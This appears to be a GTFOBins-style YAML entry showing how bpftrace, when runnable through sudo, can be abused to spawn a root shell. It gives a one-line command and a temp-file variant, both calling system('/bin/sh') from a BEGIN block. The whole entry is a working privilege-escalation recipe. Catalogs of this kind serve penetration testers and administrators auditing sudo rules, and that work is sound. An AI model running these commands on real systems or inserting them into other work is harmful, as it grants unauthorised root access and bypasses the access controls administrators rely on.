---
functions:
  sudo:
    - code: sudo bpftrace -e 'BEGIN {system("/bin/sh")}'
    - code: |
        TF=$(mktemp)
        echo 'BEGIN {system("/bin/sh")}' >$TF
        sudo bpftrace $TF
---
